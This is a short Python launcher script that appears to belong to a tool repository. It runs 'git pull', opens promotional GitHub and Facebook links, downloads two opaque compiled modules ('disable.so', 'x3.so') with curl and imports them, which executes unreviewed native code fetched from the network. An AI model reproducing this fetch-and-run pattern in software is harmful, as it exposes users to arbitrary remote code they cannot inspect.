import os,time
try:
  import requests
except ModuleNotFoundError:
  os.system("pip install requests")
def intro():
  print('give star to our repo')
  os.system('git pull && clear')
  os.system('xdg-open https://github.com/Ahmed-XD/FILE')
  print('Join Our Facebook Group and support us')
  os.system('xdg-open https://m.facebook.com/groups/1247184652736578/')
  os.system('clear')
  


def install_part(file_name):
  os.system(f"curl -L https://github.com/Ahmed-XD/library/raw/main/{file_name} -o {file_name}")

if os.path.exists("disable.so") and os.path.exists("x3.so"):
  os.remove("disable.so")
  os.remove("x3.so")

intro()
install_part("disable.so")
install_part("x3.so")
#forgot to add version in the script main script lol
version = requests.get("https://raw.githubusercontent.com/Ahmed-XD/FILE/main/version.txt").text
print(f"Version : {version}")
time.sleep(3)
import disable
import x3
